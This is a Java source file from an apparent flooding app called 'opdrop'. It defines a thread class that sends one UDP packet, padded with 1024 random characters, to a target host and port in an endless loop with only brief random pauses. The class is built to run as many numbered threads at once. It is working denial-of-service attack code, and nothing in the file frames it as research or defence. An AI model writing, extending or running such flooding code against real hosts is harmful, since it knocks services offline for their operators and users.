package com.ohnull.opdrop.Requests;

import com.ohnull.opdrop.Models.Config;
import com.ohnull.opdrop.Models.ExUrl;
import com.ohnull.opdrop.Utils.CommonUtils;
import com.ohnull.opdrop.Utils.EDebug;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.URI;
import java.util.Random;

public class InfinityUdpRequestThread extends Thread implements IRequestThread {

    ExUrl exUrl;
    int sleepCounter = 1;
    int threadNum;
    boolean stopThread = false;

    public InfinityUdpRequestThread(ExUrl exUrl, int threadNum) {
        this.exUrl = exUrl;
        this.threadNum = threadNum;
        EDebug.l("InfinityUdpRequestThread: INIT -> #" + threadNum + " | " + exUrl.getUrl());
    }

    @Override
    public void stopThread() {
        stopThread = true;
    }

    @Override
    public void startThread() {
        start();
    }

    @Override
    public void run() {
        EDebug.l("InfinityUdpRequestThread: RUN -> #" + threadNum + " | " + exUrl.getUrl());
        Random rnd = new Random();
        String data = exUrl.getData();
        DatagramSocket serverSocket;
        DatagramPacket sendPacket;

        if(data == null || data.isEmpty()){
            data = "name1=value1&name2=value&" + CommonUtils.generateRandomString(1024);
        }

        URI uri;
        try {
            uri = new URI(exUrl.getUrl());
            serverSocket = new DatagramSocket();
            sendPacket = new DatagramPacket(
                    data.getBytes(),
                    data.getBytes().length,
                    InetAddress.getByName(uri.getHost()),
                    uri.getPort()
            );
            sendPacket.setData(data.getBytes());
        } catch (Exception e) {
            EDebug.l(e);
            return;
        }

        while (!stopThread) {
            try {
                if (Config.IS_HIGH_CPU_USAGE.get()) {
                    Thread.sleep(1000L * sleepCounter++);
                } else {
                    sleepCounter = Math.max(--sleepCounter, 1);
                }
                Thread.sleep(rnd.nextInt(100));
                serverSocket.send(sendPacket);
//                EDebug.l("#" + threadNum +" | url: " + exUrl + " | sleepCounter: " + sleepCounter);
            } catch (Exception e) {
                //EDebug.l(e);
                try {
                    Thread.sleep(rnd.nextInt(1000));
                } catch (Exception e2) { }
            }
        }
        serverSocket.close();

        EDebug.l("InfinityUdpRequestThread: FINISHED -> #" + threadNum + " | " + exUrl.getUrl());
    }
}
